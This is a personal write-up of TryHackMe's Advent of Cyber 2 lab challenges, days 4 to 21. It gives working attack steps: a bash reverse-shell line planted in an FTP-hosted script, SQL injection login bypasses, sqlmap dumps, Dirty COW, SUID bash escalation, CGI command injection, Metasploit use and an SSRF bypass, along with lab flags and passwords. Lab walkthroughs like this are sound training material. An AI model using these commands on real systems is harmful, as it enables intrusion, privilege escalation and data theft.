# [Advent Of Cyber 2](https://tryhackme.com/room/adventofcyber2)

## Day 4 -  Santa's watching [Gobuster, wfuzz]

target_ip : 10.10.161.119

### [Gobuster](http://manpages.ubuntu.com/manpages/cosmic/man1/gobuster.1.html)

- wordlist : /usr/share/wordlist

- wordlist used : /usr/share/wordlist/dirb/big.txt

`gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`

### [wfuzz](https://manpages.debian.org/buster/wfuzz/wfuzz.1.en.html)

`wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 57 localhost:80/FUZZ/note.txt`

`--hw 57` suggests to hide all pages that have 57 words on them

### Challenges Ans:

1. **Qus:** Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)

   Note: For legal reasons, do not actually run this command as the site in question has not consented to being fuzzed!

   **ANS:** `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`

2. **Qus:** Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there?

   **ANS:** using `gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/big.txt` found:
  
    > ```/.htaccess (Status: 403)
    > /.htpasswd (Status: 403)
    > /LICENSE (Status: 200)
    > /api (Status: 301)
    > /server-status (Status: 403)``` 

    navigating to `http://target_ip/api` in the browser I found `/site-log.php`

3. **Qus:** Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

   **ANS:** using `wfuzz -c -z file,wordlist -d "date=FUZZ" -u  http://target_ip/api/site-log.php` found a response :

    > `^M000000026:ESC[0m   ESC[32m200     ESC[0m   0 L   ESC[0m   1 W     ESC[0m   13 Ch    ESC[0m   "20201125"`
  
    which means in responce for "20201125" I received 1 W(word) or 13 Ch(characters), besides `wordlist` is the list of 
  dates formatted with YYYYMMDD
  
    using 'curl http://10.10.161.119/api/site-log.php?date=20201125' I received a key which is indeed 13 characters long

----

## Day 5 - Someone stole Santa's gift list! [SQLi, sqlmap]

target_ip : 10.10.100.16

### Challenges Ans

1. **Qus :**    Without using directory brute forcing, what's Santa's secret login panel? 
    
    **Ans :**   Started up gobuster on `target_ip:8000` which was not needed LOL.
  
    while gobuster was running on `big.txt` looked at hint and got the santas login panel by just guessing


2. **Qus :**    Visit Santa's secret login panel and bypass the login using SQLi

    **Ans :**    tried a lot of SQLi querries I failed to understand the database server being used and what version of it.

    fired up `target_ip:8000` on the browser and logged into santa's admin pannel by using a simple SQLi `' or true --`

3. **Qus :**    How many entries are there in the gift database?

    **Ans :**   There was a search bar where I can search by gift names. There too I listed all the values in the table(luckyly it wasn't too long) by the same SQLi `' or true --`.

    From it I got 22 rows of data and Paul's wish.

4. **Qus :** What did Paul ask for?
    
    **Ans :** well look up ^_^

    There was only 2 colums there which I came to know by using `ORDER BY 1,2,3,....` and I got back a result saying `error : 3rd ORDER BY term out of range - should be between 1 and 2`

5. **Qus :** What is the flag? 

    **Ans :**   used burpsuit to capture request for both to login to santas panel(POST) and gift search query(GET). Saved thouse into files.
  
    used the files into `sqlmap` with `--tamper=space2comment` got some output but can't understand it.

    okey database server was `sqlite`(given info) running sqlmap on gift request file using 
  
   `sqlmap -r request --tamper=space2comment --dump-all --dbms sqlite` 
  
    and saved it in a file. Well it has everithing I need

6. **Qus :** What is admin's password?

    **Ans :** look up ^_^ (again)

- **NOTE**

  - I was wrong about 2 columns cuz there was three for the gifts(kids,age,title)

  - sqlmap saves the database dumps in `/home/<usrname>/.local/share/sqlmap/output/<target-machine-ip>/dump/<database_name>/<table_name>.csv`


----

## Day 6 - Be careful with what you wish on a Christmas night [XSS, OWASP ZAP]

target_ip : 10.10.151.94

### Challenged Ans

1.  **Qus :** Vulnerability type was used to exploit the application 
  
    **Ans :** `Stored cross-site scripting`

2.  **Qus :** query string can be abused to craft a reflected XSS? 
    
    **Ans :** fired up `http://target_ip:5000` in the browser and searched for a wish  it appends `?q="wish"` at the end

3.  **Qus :** how many XSS alerts are in the scan?
    
    **Ans :** opened OWASP ZAP(zed attack proxy) and did an automatic scan on `http://10.10.151.94:5000` found vulnerabilities by navigting to `Alerts` tab after the scan was complete`
----

## Day 7 - The Grinch Really Did Steal Christmas[WireShark]

### Challeng Ans

1.  **Qus :** "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping? 
    
    **Ans :** used filter `icmp.resp_in` which filters out ping `request` packets(see more `icmp.resp_to`)

2.  **Qus :** If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?
    
    **Ans :** `http.request.method == GET`

3.  **Qus :** Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "10.10.67.199" visited?
    
    **Ans :** `reindeer-of-the-week`
    
4.  **Qus :** analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?
    
    **Ans :** filter `ftp.request.arg` OR filter `tcp.port == 21` ==> follow ==> tcp stream

5.  **Qus :** Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?
    
    **Ans :** `ssh`

6.  **Qus :** Analyse "pcap3.pcap" and recover Christmas!

    What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?
    
    **Ans :** filtering `http.request.method == GET` found a nice packet requesting `chiristmas.zip` 
    `291	26.537049	10.10.53.219	10.10.21.210	HTTP	215	GET /christmas.zip HTTP/1.1`
    
    - exported that file 
    - unziped it 
    - less `elf_mcskidy_wishlist.txt`


Note:
1. use filter
2. follow a packet
3. export download files

----

## Day 8: What's Under the Christmas Tree? [nmap]

target_ip : 10.10.221.85

### Challenge Ans

1.  **Qus :** When was snort created ?

    **Ans :** `1998`

2.  **Qus :** Using nmap on `target_ip`, what was the port numbers of the three servces running ? 

    **Ans :** Use `sudo nmap -A <ip> -A`: Enable OS detection, version detection, script scanning, and traceroute

3.  **Qus :** Run a scan and provide the -Pn flag to ignore ICMP being used to determine if the host is up

    used `sudo nmap -Pn <ip> -Pn` : Treat all hosts as online -- skip host discovery

4.  **Qus :** Experiment with different scan settings such as-A and -sV whilst comparing the outputs given.
    
    **Ans :** 
    
    1.  sudo nmap -o <ip> -O: Enable OS detection
    
    2.  sudo nmap -p <port(s)> <ip>
    
    3.  sudo nmap -p- <start_port-end_port> <ip>
    
    4.  sudo nmap -sV <ip> -sV: Probe open ports to determine service/version info

    5.  sudo nmap -sV -sC <ip> -sC: equivalent to --script=default

5.  **Qus :** Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running? 
    
    **Ans :** used `sudo nmap -o <ip> -O` : Enable OS detection

6.  **Qus :** Use Nmap's Network Scripting Engine (NSE) to retrieve the "HTTP-TITLE" of the webserver. Based on the value returned, what do we think this website might be used for? - blog 
    
    **Ans :** used `sudo nmap -sC -sV <ip>`

7.  **Qus :** Now use different scripts against the remaining services to discover any further information about them.

***NOTE***

See more : `Supply Chain Exploit`, IDS, IPS

----

## Day 9 - Anyone can be Santa! [FTP]

1.  `ftp 10.10.143.226` - username : `anonymous`

2.  `get public/backup.sh`

3.  to get a reverse shell on bash tcp added a line to the executable:
    `bash -i >& /dev/tcp/<my-ip>/4242 0>&1`
    
4.  listen for incomming traffic using netcat:
    `nc -lvnp 4242`
    
5.  upload the edited file in the same dir using `put`

6.  got a reverse shell back on the netcat listner. cat paste the `flag.txt`
    
### Challenges Ans

1.  **Qus :** Name the directory on the FTP server that has data accessible by the "anonymous" user 

    **Ans :** Login with `ftp 10.10.143.226` - username : `anonymous`.

    list all directories use `ls -la` 

    now use `ls dir_name` replace the `dir_name` with the directory names found with the previous command, it will deny to execute if you dont havr permission. 
    
2.  **Qus :** What script gets executed within this directory?

    **Ans :** look for files with extention `*.sh`

3.  **Qus :** What movie did Santa have on his Christmas shopping list? 

    **Ans :** see the contents of the `*.txt` file. in the pubilc folder

4.  **Qus :** Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

    Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.
    
    **Ans :** download the `backup.sh` with `get backup.sh`

    edit the executable file and add the line `bash -i >& /dev/tcp/Your_tun0_IP/4444 0>&1`

    in your terminal listen for port 4444 with `sudo nc -lvnp 4444` to get the reverse shell 

    upload `backup.sh` again with `put backup.sh`

    `cat /root/flag.txt`

----

## Day 10: Don't be so sElfish[smb, enum4linux]

target_ip : 10.10.124.74

1.  looking at the help text for `enum4linux` using : `enum4linux -h`


2.   **userlist** : finding user list in smb using : 	`enum4linux -U <target_ip>` found 
  
	  ```
	  user:[elfmcskidy] rid:[0x3e8]
	  user:[elfmceager] rid:[0x3ea]
	  user:[elfmcelferson] rid:[0x3e9]
	  ```


3.  **shares** : finding shared folders in SMB with : `enum4linux -S <target_ip>`

	```
	Sharename       Type      Comment
	---------       ----      -------
	tbfc-hr         Disk      tbfc-hr
	tbfc-it         Disk      tbfc-it
	tbfc-santa      Disk      tbfc-santa
	IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
	```

4.  **logging in as SMB client** : from the logs of `enum4linux` I can find :

	```
	[+] Attempting to map shares on <target_ip>
		//<target_ip>/tbfc-hr  Mapping: DENIED, Listing: N/A
		//<target_ip>/tbfc-it  Mapping: DENIED, Listing: N/A
		//<target_ip>/tbfc-santa       Mapping: OK, Listing: OK
		//<target_ip>/IPC$     [E] Can't understand response:
	```

	from which I can tell `//<target_ip>/tbfc-santa` doesn't reuqire passwd

	Anyway I tried to access all the shares with random password or no password using : `smbclient //<target_ip>/<sharename>`

		//<target_ip>/tbfc-hr - gave me NT_STATUS_ACCESS_DENIED
		//<target_ip>/tbfc-it - gave me NT_STATUS_ACCESS_DENIED  
		//<target_ip>/tbfc-santa - logged in without any passwd
		//<target_ip>/IPC$ - logged in without any passwd


5.  Well `/IPC$` was filled with void, so I considered to look at `tbfc-santa`
	found one directory(`/jingle-tunes`) and a text file(`note_from_mcskidy.txt`) there.


### Challenges Ans:

1.	**Qus :** Using enum4linux, how many users are there on the Samba server (<target_ip>)?

    **Ans :** `3`

2.	**Qus :** Now how many "shares" are there on the Samba server? 

    **Ans :** `4`

3.	**Qus :** Use smbclient to try to login to the shares on the Samba server (<target_ip>). What share doesn't require a password?

    **Ans :** `tbfc-santa`

4.	**Qus :** Log in to this share, what directory did ElfMcSkidy leave for Santa?
    
    **Ans :** `jingle-tunes`


### NOTE:

- see more - password spring

----

## Day 11 - The Rogue Gnome[enumeration, linEnum, linpeas, prevEsc]

target_ip : 10.10.206.228

1.  logged into target using given password of cmnatic. 

2.  **doing unnecessary things** :	copied LinEnum.sh, linpeas.sh to /tmp.  using :
- for receiver `nc -l -p 4444 > expected_file`
- for sender `nc -w 3 <receiver_ip> 4444 < expected_file`

 	and set as a executable

3.  **doing unnecessary things** : What I should have done after running LinEnum or linpeas:(which I think is not nessary for this room)

- Determining the kernel of the machine (kernel exploitation such as Dirtyc0w) 

- Locating other services running or applications installed that may be abusable (SUID & out of date software)

- Looking for automated scripts like backup scripts (exploiting crontabs)

- Credentials (user accounts, application config files..)

- Mis-configured file and directory permissions


4.  **find commands with SUID set** : 

`find / 	- sudoers-perm -u=s -type f 2>/dev/null` 
  
  logged it in suid_set.txt. Found bunch of commands in it but `bash` is enough


5.  **[GTFObins](https://gtfobins.github.io/)** :  found suid exploit for bash: `bash -p` and got root access


### Challenges Ans

 1. **Qus :**  What type of privilege escalation involves using a user account to execute commands as an administrator?
 	
    **Ans :** `Vertical`

 2.	**Qus :** What is the name of the file that contains a list of users who are a part of the sudo group?
	
    **Ans :** `sudoers`

 3.	**Qus :** Use SSH to log in to the vulnerable machine like so: ssh cmnatic@MACHINE_IP
 	
    **Ans :** Input the following password when prompted: aoc2020

 4.	**Qus :** Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.

	You may find uploading some of the enumeration scripts that were used during today's task to be useful.
	
    **Ans :** uploaded LinEnum and linpeas (not needed for the answering questions)

 5.	**Qus :** Use this executable to launch a system shell as root.

	What are the contents of the file located at /root/flag.txt?
    
    **Ans :** `thm{2fb10afe933296592}`


***NOTE :*** 
-	Eternalblue,
-	/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
-	"/var/log/syslog" (System events such as firewall alerts:)
-	"/var/log/<service>/" For example, the access logs of apache2 /var/log/apache2/access.log"

----

## Day 12: Ready, set, elf.[CGI, Metasploit]

target: 10.10.36.221

1.  **nmap** : normal nmap scan(-sC -sV -O -Pn -T4) revealed open ports  

	PORTS  		    SERVICE 	  VERSION
	- 3389/tcp open ms-wbt-server Microsoft Terminal Services
	- 8009 		    ajp13         Apache Jserv (Protocol v1.3)
	- 8080 		    http-proxy    Apache Tomcat 9.0.17
	- 5357/tcp open  wsdapi?

    OS : Windows; also it is given in challeng that it is "Windows machine"

2.  **nmap vuln** : vuln script scan(--script vuln) revealed it is LIKELY VULNERABLE to Slowloris attack[CVE:CVE-2007-6750]

3.  **vulnerable** : Found Apache Tomcat 9.0.17 is vulnerable to CGI attack [CVE-2019-0232](https://www.cvedetails.com/cve/CVE-2019-0232/)

4.  **flag** it was given that :

    > "To solve Elf McSkidy's problem with the elves slacking in the workshop, he has created the CGI script: elfwhacker.bat"
	
    - so excuting `http://10.10.36.221:8080/cgi-bin/elfwhacker.bat?&dir` got to list the cotents of the directory

    - there was the file `flag1.txt` and displayed the content of the file by : 
	http://10.10.36.221:8080/cgi-bin/elfwhacker.bat?&type+flag1.txt

5.  **metaspolit**

    - searching for the exploit `use CVE_no`

    - setting lhosts(listning host), rhost(target), and ports on both(dont need to be same), and the targeturi `/cgi-bin/<binary>`

    - run

    - failed


6.  **metaspolit 2nd try**

    - searching for the exploit `use CVE_no`

    - setting lhosts(listning host), rhost(target), set lport to `4004`, and the targeturi `/cgi-bin/<binary>`
    
    - run `exploit`
    
    - SUCCESSFULL
    
    - user id : TBFC-WEB-01\elfmcskidy (`getuid`)
    
    - OS : Windows 2016+ (10.0 Build 17763) on x64 platform. (`sysinfo`)
    
    - priviledges of current user : 
        ```
        SeBackupPrivilege
        SeChangeNotifyPrivilege
        SeCreateGlobalPrivilege
        SeCreatePagefilePrivilege
        SeCreateSymbolicLinkPrivilege
        SeDebugPrivilege
        SeImpersonatePrivilege
        SeIncreaseBasePriorityPrivilege
        SeIncreaseQuotaPrivilege
        SeIncreaseWorkingSetPrivilege
        SeLoadDriverPrivilege
        SeManageVolumePrivilege
        SeProfileSingleProcessPrivilege
        SeRemoteShutdownPrivilege
        SeRestorePrivilege
        SeSecurityPrivilege
        SeShutdownPrivilege
        SeSystemEnvironmentPrivilege
        SeSystemProfilePrivilege
        SeSystemtimePrivilege
        SeTakeOwnershipPrivilege
        SeTimeZonePrivilege
        SeUndockPrivilege
        ```
    - checking for if we'er in VM: This is a VMware Virtual Machine (`run post/windows/gather/checkvm`)
    - to check if prev esc is posssible(`run post/multi/recon/local_exploit_suggester`)
    Found two vulnerabilities :
    ```
    [+] <target> - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
    [+] <target> - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
    ``` 
    - [CVE-2020-1048](https://attackerkb.com/topics/QoQvwrIqEV/cve-2020-1048-windows-print-spooler-elevation-of-privilege-vulnerability?referrer=search#vuln-details) - Windows Print Spooler Elevation of Privilege Vulnerability

7.  - just `migrate`ing to `spoolsv.exe` gave me the system priviledge
    - checked using `get uid` which produced output `Server username: NT AUTHORITY\SYSTEM`

### Challenges Ans

1.	What is the version number of the web server? 
	
    **Ans :** `9.0.17`

2.	What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
	
    **Ans :** `CVE-2019-0232`

3.	Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

5.	What are the contents of flag1.txt? 
	
    **Ans :** `thm{whacking_all_the_elves}`

6.	Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

***NOTE***

learn Metaspolit

----

## Day 13 - Coal for Christmas[SPECIAL, telnet, Enumeration, dirtyCow, md5]

target : 10.10.242.55

1.  `nmap <target>` revealed open ports ;
```
PORT    STATE SERVICE
22/tcp  open  ssh
23/tcp  open  telnet
111/tcp open  rpcbind  
```

2.  `telnet 10.10.242.55 23` prompted with

    - username-santa  and 
    - password-clauschristmas 

    and it worked LOL.

3.  found 2 files inside `/home/santa` : `hristmas.sh`, `cookies_and_milk.txt` 

4.  - `cat /etc/*release` revealed it is running `Ubuntu 12.04 LTS`

    - `uname -a` revealed the kernel `3.2.0-23-generic` supports both x86 and x64

    - `cat /etc/issue` left a note with username `santa` and its password and it added "We left you cookies and milk!"

5.  - `cat cookies_and_milk.txt`
    - `cat christmas.sh`

6.  found [dirty.c](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c) exploiting `dirtyc0w`(CVE-2016-5195)

7.  compiles dirty cow(copy-on-write) with `cc -pthread dirty.c -o dirty -lcrypt` and ran it with `./dirty` 
it created a new account with username `firefart` with root priviledges

8.  logged in to `firefart` with `su firefart` 

9.  followed the instruction given in `\root\message_from_the_grinch.txt`

### Challenges Ans

1. **Qus:** What old, deprecated protocol and service is running?

   **Ans:** `Telnet`

2. **Qus:** What credential was left for you?

   **Ans:**  Writeups should have a link to TryHackMe and not include any [passwords](`clauschristmas`)/cracked hashes/flags

3. **Qus:** What distribution of Linux and version number is this server running?

   **Ans:** `Ubuntu 12.04`

4. **Qus:** Who got here first?

   **Ans:** `Grinch`

5. **Qus:** What is the verbatim syntax you can use to compile, taken from the real C source code comments?

   **Ans:** `gcc -pthread dirty.c -o dirty -lcrypt`

6. **Qus:** What "new" username was created, with the default operations of the real C source code?

   **Ans:** `firefart`

7. **Qus:** What is the MD5 hash output?

   **Ans:** `8b16f00dd3b51efadb02c1df7f8427cc`

----

## Day 14: Where's Rudolph?[OSINT]

### Objectives of the day :
- user : Rudolph
- site : Reddit
- username : IGuidetheClaus2020


1) Identify important information based on a user's posting history.
2) Utilize outside resources, such as search engines, to identify additional information, such as full names and additional social media accounts.

1.  Found Rudlof on Reddit searching by his user name in `https://whatsmyname.app/`

    - Found he's born in `chicago` and he mentioned his creator is `robert`
    - And found he has a `twitter` account

2.  Going twitter and searching with the same username I got only one account `https://twitter.com/IGuideClaus2020`. Went throught bunch of tweets to get info about `Rudlof`

    - found lots of tweets of `bacheloratte`
    - reverse image searching from a tweet got adderss
    - got a lot of info(EXIF) out of a direct image link using `http://exif.regex.info`
    - foung email address and searched(`email:rudolphthered@hotmail.com`) for it in `https://scylla.sh/api` for breaches and found one breach whic exposed the password

3.  By searching with the coordinates of the image in google maps, found a mariot hotel really close to it, the address was:
`540 N Michigan Ave, Chicago, IL 60611, United States`

4.  The reverse image srch also gave me a string `rudolph the red nosed reindeer` searching by it I got to know the creator of Rudlof `Robert L. May`

### Challenge Ans

1.  **Qus:**  What URL will take me directly to Rudolph's Reddit comment history?
 
    **Ans:** `https://www.reddit.com/user/IGuidetheClaus2020/comments/`
 
2.  **Qus:** According to Rudolph, where was he born?

    **Ans:** `Chicago`

3.  **Qus:** Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?
    
    **Ans:** `May`

4.  **Qus:** On what other social media platform might Rudolph have an account?
    **Ans:** `Twitter`

5.  **Qus:** What is Rudolph's username on that platform?
    
    **Ans:** `IGuideClaus2020`

6.  **Qus:** What appears to be Rudolph's favorite TV show right now?

    **Ans:** `bachelorette`

7.  **Qus:** Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?
  
    **Ans:** `chicago`

8.  **Qus:** Okay, you found the city, but where specifically was one of the photos taken?

    **Ans:** 41.891815, -87.624277

9.  **Qus:** Did you find a flag too?

    **Ans:** {FLAG}ALWAYSCHECKTHEEXIFD4T4

10. **Qus:** Has Rudolph been pwned? What password of his appeared in a breach?

    **Ans:** `spygame`

11. **Qus:** Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?

    **Ans:** `540`
---

## Day 15 - There's a Python in my stocking! [Python]

### Challenges Ans

1.  **Qus :** What's the output of True + True?

    **Ans :** `2`

2.  **Qus :** What's the database for installing other peoples libraries called?

    **Ans :** `PyPi`

3.  **Qus :** What is the output of bool("False")?

    **Ans :** `True`

4.  **Qus :** What library lets us download the HTML of a webpage?

    **Ans :** `Requests`

5.  **Qus :** What is the output of the program provided in "Code to analyse for Question 5" in today's material?

    **Ans :** `[1, 2, 3, 6]`

6.  **Qus :** What causes the previous task to output that?

    **Ans :** `pass by reference`

--- 

## Day16 - Help! Where is Santa?[python scripting]

target : 10.10.163.203

### walkthrough

1. started by simply scannning the `target` with `nmap -sC -sV -O`. Found only one port `8000` open

2. browsed to `http://<target>:8000/static/index.html` fetched all the unique links in that page with a python script[`python script.py http://<target>:8000/static/index.html`]:

    ```python
    from bs4 import BeautifulSoup
    import requests 
    import sys

    def main():
        if len(sys.argv) != 2:
            sys.exit("Usage: python fetch_anchor.py <url>")

        uniq = set()
        html = requests.get(sys.argv[1]) 
        soup = BeautifulSoup(html.text, "lxml") 
    
        links = soup.find_all('a') 
        for link in links:
            if "href" in link.attrs:
                uniq.add(link["href"])
    
        for i in uniq:
          print(i)

    if __name__ == "__main__":
        main()
    ```

3.  The above sctipt threw `http://machine_ip/api/api_key` as one of the links. Using the suggestions given in the challenge page I enumerated odd api keys to find the right api_key to find santa's location using a python script(again) [`python script.py http://<target>/api`]
    
    ```python
    import requests 
    import sys
    
    def main():
        if len(sys.argv) != 2:
            sys.exit("Usage: python emum_apikey.py <url>"+
            "\n Example : python emum_apikey.py http://example.com/api")
  
        for key in range(11,100,2):
          html = requests.get(f"{sys.argv[1]}/{key}") 
          print(f"{sys.argv[1]}/{key} : {html.text}")
  
    if __name__ == "__main__":
        main()
    ```

4.  found a response at `http://10.10.128.8:8000/api/57` `{"item_id":57,"q":"Winter Wonderland, Hyde Park, London."}`. Thats it.DONE.

### Challenges Ans:

1.  **Qus** What is the port number for the web server?

    **Ans** `8000`

2.  **Qus** Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)

    **Ans** `/api/`

3.  **Qus** Where is Santa right now?

    **Ans** `Winter Wonderland, Hyde Park, London.`

4.  **Qus** Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. To unblock yourself, simply terminate and re-deploy the target instance (MACHINE_IP)

    **Ans** `57`


## Day 17 - ReverseELFneering[radare2]

### Walk Through

1. opening a binary in r2 : `r2 -d ./binary`. this will open in debug mode

2. analyse the binary : `aa`

3. use `afl` to list all the functions. In my case I listed `main` function by piping it to `grep` 

4. examine the assembly code at main by running `pdf @main`(Print Disassembly Function) 

5. add a breakpoint using `db` in my case : `db 0x00400b55`. `pdf @main` will show `b` beside the instruction set where is the the break point being added 
   `mov dword [var_ch], 4`
   `var_ch` is stored at `@rbp-0xc`

6. `dc` starts executing the code untill it hits the break point

7. we can see a what a memory location stores with `px @memory-address`, in my case `px @rbp-0xc`

8. we goto the next instruction with 'ds'.

9. Now if I check `px @rbp-0xc`, I see 04 at the begenning of the memory address which was `00` before

10. to see the registers we can use `dr`



### Challenges Ans

Use your new-found knowledge of Radare2 to analyse the "challenge1" file in the Instance 10.10.78.42 that is attached to this task to answer the questions below.

1.  **Qus :** What is the value of local_ch when its corresponding movl instruction is called (first if multiple)? 

    **Ans :** `1`

2.  **Qus :** What is the value of eax when the imull instruction is called?

    **Ans :** `6`

3.  **Qus :** What is the value of local_4h before eax is set to 0?

    **Ans :** `6`

---

## Day 18 - The Bits of Christmas [ILSpy]

### Walk through

1.  opened remima to connect to remote host with given credentials

2.  opened remima to connect to remote host with given credentials

3.  tried to guess random passswords to get to santas dash-board

4.  fired up [`ILspy`](https://github.com/icsharpcode/ILSpy) and opend the `.exe` file in it

5.  found `buttonActivate_Click` function under `CrackMe` => 'Mainform' under which I found the password checking logic. The varriable to which it was being compared with double clicked it. found the hex value of the varriable

6.  went to [cyberchef](https://gchq.github.io/CyberChef/) and copy pasted the hex in the `input` box and dragged `From Hex` into `Recepie` it gave me the password in plain text. 

### Challenges Ans

1.  **Qus :** Open the "TBFC_APP" application in ILspy and begin decompiling the code

2.  **Qus :** What is Santa's password?
    
    **Ans :** `santapassword123`

3.  **Qus :** Now that you've retrieved this password, try to login...What is the flag?
    
    **Ans :** `thm{046af}`

---


## Day 19 - The Naughty or Nice List [Server-Side Request Forgery]

target : 10.10.14.64

### Walk through

1.  fired up `http://target` in my browser. The page has two sections 
    - one to search by name to check which list they are in NICE/NAUGHTY list 
    - another section deals with admin login with username and password

2.  searched my name to see where I belong(I knew I'm nice anyways). it generated something interresting in the url : `http://10.10.14.64/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dsantaa`

3.  went to cyberchef to understand what is gibbrish means. Using `URL decode` I got `http://10.10.14.64/?proxy=http://list.hohoho:8080/search.php?name=santaa`(I searched for `santaa`)

    well it looks like the site uses proxy another answer my search, a proxy to a local service.

4.  browsing to [http://10.10.14.64/?proxy=http://list.hohoho:8080](http://10.10.14.64/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F) gave 404 error message, "NOT FOUND" 

5.  requesting to connect to the port 80 by [http://10.10.14.64/?proxy=http://list.hohoho:80](http://10.10.14.64/?proxy=http%3A%2F%2Flist.hohoho%3A80%2F) the server responded : `Failed to connect to list.hohoho port 80: Connection refused`

5.  requesting to connect to the port 22 by [http://10.10.14.64/?proxy=http://list.hohoho:22](http://10.10.14.64/?proxy=http%3A%2F%2Flist.hohoho%3A22%2F) the server responded : `Recv failure: Connection reset by peer` which suggests that port 22 is open but did not understand what was sent.

6.  tried to use diffirent proxies but they were bloked by the website.

7.  enumerating several proxies I came to know the website only takes the proxy only when it starts with `list.hohoho`. This logic can be bypassed easily by using a sub domain like `list.hohoho.sub.domain.com`

8.  there is already exists which points to `127.0.0.1` using that we can pretend to the server that we are in the local network.

9. Now lets use `list.hohoho.localtest.me` which  resolves to `127.0.0.1`.
    Wow magically the webite gives santa a hint to guess the passwd

Thats enough for today :D

10. NO login as *Santa* with the hint and Delete the naughty list(Case does matter)

### Challenge Ans

1.  **Qus :** What is Santa's password?

    **Ans :** `Be good for goodness sake!`

2.  **Qus :** What is the challenge flag?

    **Ans :** `THM{EVERYONE_GETS_PRESENTS}`

---

## Day 20 - PowershELlF to the rescue[powershell]

target : 10.10.202.54

### Walk through

1.  ssh the target using `ssh -l mceager <target>` and use passwd `r0ckStar!`

2.  switch to powershell by simply using `powershell`. Every prompt will start with `PS` if you are in the powershell env

3.  change directory to `.\Documents` by using `Set-Location <path>`

4.  list the files with `Get-ChildItem`, but I see there is only one file `elfone.txt`. Saw the contents of the file using 'Get-Content'. it  said "Nothing to see here..." so I used `Get-Children -Hidden` to see only hidden files on the directory and found what elf-one wants in `e1fone.txt`

5.  changed directory to Desktop with `Set-Location ..\Desktop\`. listing with `Get-ChildItem` listed nothing so again used `-Hidden`. Found a directory `elf2wo`, moved to it and found what elf2 wants using only `Get-ChildItem` in a file,`e70smsW10Y4k.txt` which was *not hidden*

6.  next went to `C:\Windows\System32` using John hamonds help and used `Get-ChildItem -Directory -Hidden -Filter *3*` to get the hidden dir of elf3 which is `3lfthr3e`

7.  in `C:\Windows\System32\3lfthr3` using `Get-ChildItem -Hidden` found 2 files `1.txt` and `2.txt`

8.  Using `Get-Content -Path 1.txt | Measure-Object -Word` found first file has `9999` words

9.  with `(Get-Content -Path .\1.txt)[551,6991]` found what was in 2nd file at index 551 and 6991

10. Used `Get-Content 2.txt | Select-String -Pattern "redryder"` gave me the final answer


### Challenge Ans

1.  **Qus :** Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?

    **Ans :** `2 front teeth`

2.  **Qus :** Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?

    **Ans :** `Scrooged`

3.  **Qus :** Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while)

    **Ans :** `3elthr3e`

4.  **Qus :** How many words does the first file contain?

    **Ans :** `9999`

5.  **Qus :** What 2 words are at index 551 and 6991 in the first file?

    **Ans :** `Red Ryder`

6.  **Qus :** This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer)

    **Ans :** `red ryder bb gun`

---

## Day 21 - Time for some ELForensicsy[ADS, NTFS]


### Walk-Through

1.  `Set-Location .\Documents`

2.  `Get-ChildItems` listed `db file hash.txt` and `deebee.exe` 

3.  `Get-Content db file hash.txt`

4.  `Get-FileHash -Algorithm MD5 .\deebee.exe` the hash don't match (and the filename too lol)

5. run `deebee.exe` with `.\deebee.exe`

6. String64.exe is AWESOME : `C:\Tools\string64.exe -acceptelua deebee.exe` will scan the file you pass it for strings of a default length of 3 or more characters. I provided a interresting string which came up in this scan.
    ```
    Set-Content -Path .\lists.exe -value $(Get-Content $(Get-Command C:\Users\littlehelper\Documents\db.exe).Path -ReadCount 0 -Encoding Byte) -Encoding Byte -Stream hidedb
    ```

    (And Flag TOO)

7.  `Get-Item -Path deebee.exe -Stream *` to get the **Alternate Data Stream** (ADS) 

8.  `wmic process call create $(Resolve-Path .\deebee.exe:hidedb)` will run the actual database connector which was hidden by someone and will handover a FLAG to you. 



### Chllenges-Ans

1.  **Qus :** Read the contents of the text file within the Documents folder. What is the file hash for db.exe?
    
    **Ans :** `596690FFC54AB6101932856E6A78E3A1`

2.  **Qus :**What is the file hash of the mysterious executable within the Documents folder?
    
    **Ans :** `5F037501FB542AD2D9B06EB12AED09F0`

